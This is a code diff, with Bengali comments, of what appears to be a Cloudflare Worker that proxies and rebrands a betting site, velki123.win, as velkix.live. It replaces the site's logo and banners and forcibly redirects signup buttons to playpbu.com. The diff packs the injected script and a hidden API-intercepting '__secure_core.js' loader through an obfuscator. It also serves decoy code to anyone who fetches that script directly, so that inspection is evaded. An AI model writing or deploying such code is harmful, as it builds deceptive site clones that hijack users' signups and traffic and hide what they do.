@@ -22,7 +22,6 @@ export default {
     if (url.pathname === '/__secure_core.js') {
         const referer = request.headers.get("Referer");
         
-        // যদি কেউ সরাসরি লিংক ওপেন করে কোড চুরি করতে চায়, তবে তাকে ফেক কোড দেখানো হবে
         if (!referer || !referer.includes(url.hostname)) {
             return new Response(`console.log("Access Denied: Nice try, but you can't copy this code! 😎");`, {
                 status: 200,
@@ -30,7 +29,6 @@ export default {
             });
         }
 
-        // 🔹 ইন্টারসেপ্টর কোড (এটিও এখন অটোমেটিক প্যাকারের মাধ্যমে যাচ্ছে) 🔹
         const rawJs = `
           (function() {
             const proxyPrefix = '/__api_proxy/';
@@ -64,7 +62,6 @@ export default {
           })();
         `;
         
-        // প্যাকার ইঞ্জিনের মাধ্যমে কোডটিকে এনক্রিপ্ট করা হলো
         const secretCode = autoPackJS(rawJs);
 
         return new Response(secretCode, {
@@ -159,32 +156,37 @@ export default {
         text = text.replaceAll(/velki123\.win/gi, "velkix.live");
         text = text.replaceAll(/velki123/gi, "velkix.live");
 
-        // 🔹 লোগো হাইড ও রিপ্লেসমেন্ট 🔹
         const newLogoUrl = "https://i.postimg.cc/J0P019Hr/20260408-225146.webp";
         text = text.replaceAll("../../assets/images/velki-logo.png", newLogoUrl);
         text = text.replaceAll("/assets/images/velki-logo.png", newLogoUrl);
         text = text.replaceAll("assets/images/velki-logo.png", newLogoUrl);
 
-        // 🔹 লগিন ব্যানার পারফেক্টলি রিপ্লেসমেন্ট (ডুপ্লিকেট বাগ ফিক্সড) 🔹
         const newLoginBanner = "https://i.postimg.cc/CLCXKkN6/20260408-232743.webp";
         text = text.replaceAll("../../assets/images/velki-login-signup-banner.png", newLoginBanner);
         text = text.replaceAll("../assets/images/velki-login-signup-banner.png", newLoginBanner);
         text = text.replaceAll("/assets/images/velki-login-signup-banner.png", newLoginBanner);
         text = text.replaceAll("assets/images/velki-login-signup-banner.png", newLoginBanner);
 
-        // 🔹 Sign Up লিংক পরিবর্তন 🔹
         text = text.replaceAll('class="signup" href="/"', 'class="signup" href="https://playpbu.com"');
 
+        // 🔹 আল্ট্রা সিকিউরিটি আপডেট: CSS এবং সিকিউর স্ক্রিপ্ট ইনজেকশন এখন জাভাস্ক্রিপ্টের ভেতরে 🔹
         if (contentType.includes("text/html")) {
             
-            const forceCSS = `<style>
-                .logo-sec img { content: url("${newLogoUrl}") !important; width: 115px !important; height: auto !important; max-width: none !important; }
-            </style>`;
-            
-            // 🔹 এখানে আপনি আপনার সাধারণ কোড লিখবেন, বাকি কাজ প্যাকার সিস্টেম করবে 🔹
+            // এই সমস্ত কোড এনক্রিপ্ট হয়ে যাবে, সোর্স কোডে কিছুই বোঝা যাবে না
             const rawForceJs = `
-                setInterval(() => {
-                    document.querySelectorAll('.signup').forEach(btn => {
+                // ১. ডাইনামিক CSS ইনজেকশন (লোগো সাইজ)
+                var s = document.createElement('style');
+                s.innerHTML = '.logo-sec img { content: url("${newLogoUrl}") !important; width: 115px !important; height: auto !important; max-width: none !important; }';
+                document.head.appendChild(s);
+
+                // ২. সিকিউর কোর স্ক্রিপ্ট ইনজেকশন
+                var sc = document.createElement('script');
+                sc.src = '/__secure_core.js';
+                document.head.appendChild(sc);
+
+                // ৩. সাইন আপ বাটন ফোর্স লিংক
+                setInterval(function() {
+                    document.querySelectorAll('.signup').forEach(function(btn) {
                         if(btn.href !== 'https://playpbu.com/') {
                             btn.href = 'https://playpbu.com';
                             btn.onclick = function(e) {
@@ -196,14 +198,13 @@ export default {
                 }, 500);
             `;
 
-            // HTML এর ভেতরে পুশ করার আগে কোডটিকে প্যাকারের মাধ্যমে এনক্রিপ্ট করা হচ্ছে
+            // শুধুমাত্র একটিমাত্র এনক্রিপ্টেড ট্যাগ ইনজেক্ট হবে
             const encryptedJsTag = `<script>${autoPackJS(rawForceJs)}</script>`;
-            const ghostScriptTag = `<script src="/__secure_core.js"></script>`;
             
             if (text.includes('<head>')) {
-              text = text.replace('<head>', '<head>' + forceCSS + encryptedJsTag + ghostScriptTag);
+              text = text.replace('<head>', '<head>' + encryptedJsTag);
             } else {
-              text = forceCSS + encryptedJsTag + ghostScriptTag + text;
+              text = encryptedJsTag + text;
             }
         }
         
